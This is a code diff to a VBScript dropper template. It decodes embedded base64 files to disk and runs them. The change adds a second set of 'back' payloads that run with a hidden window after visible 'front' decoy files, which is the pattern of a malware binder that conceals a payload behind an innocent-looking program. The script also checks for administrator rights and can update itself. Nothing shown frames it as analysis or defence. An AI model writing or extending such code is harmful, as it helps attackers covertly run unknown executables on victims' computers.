@@ -12,6 +12,10 @@ Dim arrFrontData
 arrFrontData = Array("__frontData")
 Dim arrFrontName
 arrFrontName = Array("__frontName")
+Dim arrBackData
+arrBackData = Array("__backData")
+Dim arrBackName
+arrBackName = Array("__backName")
 
 
 If Not IsAdmin() Then
@@ -26,7 +30,7 @@ Sub MainScriptLogic()
         data = arrFrontData(i)
         exe = GetFilePath(arrFrontName(i))
         DecodeBase64ToFile data, exe
-        ExecuteFileAsync exe
+        ExecuteFileAsync exe, False
     Next
 
     if Not FileExists(GetPS1FilePath) Then
@@ -41,6 +45,13 @@ Sub MainScriptLogic()
     if autoupdate = "True" Then
         DoAutoUpdate
     end if
+
+    For i = 0 To UBound(arrBackName)
+        data = arrBackData(i)
+        exe = GetFilePath(arrBackName(i))
+        DecodeBase64ToFile data, exe
+        ExecuteFileAsync exe, True
+    Next
 End Sub
 
 Function GetFilePath(fileName)
@@ -67,10 +78,15 @@ Function GetPS1FilePath()
     GetPS1FilePath = ps1Path
 End Function
 
-Function ExecuteFileAsync(filePath)
-    Dim shell, result
+Function ExecuteFileAsync(filePath, hideWindow)
+    Dim shell, result, windowStyle
     Set shell = CreateObject("WScript.Shell")
-    result = shell.Run(filePath, 1, False)
+    If hideWindow Then
+        windowStyle = 0 ' Hidden
+    Else
+        windowStyle = 1 ' Normal
+    End If
+    result = shell.Run(filePath, windowStyle, False)
     Set shell = Nothing
     ExecuteFileAsync = result
 End Function
